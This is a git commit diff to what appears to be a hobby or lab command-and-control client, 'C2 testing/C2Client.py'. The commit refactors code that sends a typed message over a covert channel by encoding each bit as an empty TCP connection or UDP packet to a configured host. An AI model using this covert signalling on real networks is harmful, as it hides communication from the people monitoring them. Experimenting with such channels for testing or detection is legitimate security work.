1d9469481df0d9bf9d9b17c6242d80b2004518c1
FasCo9070 <daguirre1821@gmail.com>
2025-09-18 09:58:10 -0400

    Turned main into help function

--- C2 testing/C2Client.py
+++ C2 testing/C2Client.py
@@ -9,6 +9,7 @@ def build_socket(sockType):
     serverSock = Socket.socket(Socket.AF_INET,sockType)
     return serverSock
 
+
 def convert_to_bits(toSend:str):
     bitsOut = ""
     for letter in toSend:
@@ -16,24 +17,31 @@ def convert_to_bits(toSend:str):
     return bitsOut
 
 
+def send_traffic(message:str):
+    udpSock = build_socket(Socket.SOCK_DGRAM)
+
+    binaryToSend = convert_to_bits(message)
+    for bit in binaryToSend:
+        if int(bit) == 0: #Tcp connect
+            tcpSock = build_socket(Socket.SOCK_STREAM)
+            tcpSock.connect((HOST,PORT))
+            tcpSock.send(b"")
+            tcpSock.close()
+            time.sleep(WAITTIME)
+        else: #Udp connect
+            udpSock.sendto(b"",(HOST,PORT))
+            time.sleep(WAITTIME)
+    time.sleep(0.5)
+    udpSock.sendto(b"END",(HOST,PORT))
+
+
+
 def main():
     udpSock = build_socket(Socket.SOCK_DGRAM)
 
     while True:
         toSend = input("Message to send: ").strip()
-        binaryToSend = convert_to_bits(toSend)
-        for bit in binaryToSend:
-            if int(bit) == 0: #Tcp connect
-                tcpSock = build_socket(Socket.SOCK_STREAM)
-                tcpSock.connect((HOST,PORT))
-                tcpSock.send(b"")
-                tcpSock.close()
-                time.sleep(WAITTIME)
-            else: #Udp connect
-                udpSock.sendto(b"",(HOST,PORT))
-                time.sleep(WAITTIME)
-        time.sleep(0.5)
-        udpSock.sendto(b"END",(HOST,PORT))
+        send_traffic(toSend)
 
 
 main()
